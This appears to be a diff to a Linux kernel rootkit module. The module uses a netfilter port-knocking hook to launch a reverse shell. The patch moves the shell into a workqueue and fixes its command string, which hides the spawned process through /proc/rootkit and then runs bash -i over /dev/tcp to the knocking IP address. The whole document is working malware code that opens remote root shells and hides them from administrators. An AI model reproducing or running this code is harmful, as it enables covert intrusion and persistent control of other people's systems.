@@ -15,22 +15,30 @@ struct nf_hook_ops netf_port_knock;
 struct knocker current_knocker;
 struct semaphore knocker_sem;
 
-static void exec_command(char *bash_command){
+static char bash_command[80];
+
+static void exec_command(struct work_struct *w);
+
+DECLARE_WORK(exec_work, exec_command);
+
+static void exec_command(struct work_struct *w)
+{
 	char *argv[] = { "/bin/bash", "-c", bash_command, NULL};
-	static char *env[] = {
+
+	char *env[] = {
 		"HOME=/",
 		"TERM=linux",
 		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 
-	call_usermodehelper(argv[0], argv, env, UMH_NO_WAIT);
+	call_usermodehelper(argv[0], argv, env, UMH_WAIT_EXEC);
 }
 
 void exec_reverse_shell(u32 ip_addr)
-{
-    char bash_command[80];
-    sprintf(bash_command, "'echo hide$$ > /proc/rootkit && bash -i >& /dev/tcp/%d.%d.%d.%d/%d 0>&1'", 
+{    
+    sprintf(bash_command, "echo hide$$ > /proc/rootkit && bash -i >& /dev/tcp/%d.%d.%d.%d/%d 0>&1", 
             (u8)ip_addr >> 0, (u8)(ip_addr >> 8), (u8)(ip_addr >> 16), (u8)(ip_addr >> 24), LPORT);
-    FM_INFO("%s\n", bash_command);
+
+    schedule_work(&exec_work);
 }
 
 int knockable_port_index(int port)
